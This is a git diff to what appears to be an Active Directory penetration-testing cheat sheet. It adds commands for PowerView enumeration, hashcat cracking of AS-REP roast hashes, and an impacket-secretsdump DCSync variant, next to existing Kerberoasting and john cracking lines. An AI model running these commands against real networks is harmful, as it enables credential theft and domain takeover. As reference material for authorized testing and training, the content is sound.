@@ -40,6 +40,8 @@ Domain()
 
 ###### PowerView
 ```
+> cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./
+
 > Import-Module .\PowerView.ps1
 > Get-NetLoggedon -ComputerName computer1
 > Get-NetSession -ComputerName dc01
@@ -56,6 +58,8 @@ https://github.com/ropnop/kerbrute
 ```
 > impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
 > john tgt-file --wordlist=/usr/share/wordlists/rockyou.txt
+or:
+> hashcat -a 0 -m 18200 tgt-file /usr/share/wordlists/rockyou.txt --force
 ```
 
 ###### Kerberos ~ Kerberoasting
@@ -67,10 +71,14 @@ or:
 > python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
 ```
 
+///
+GetST
+
 
 ##### DS-SYNC attacks
 ```
 with impacket-secretsdump:
+> impacket-secretsdump domain/username@10.10.10.10
 > impacket-secretsdump domain/username:password@10.10.10.10
 
 with mimikatz:
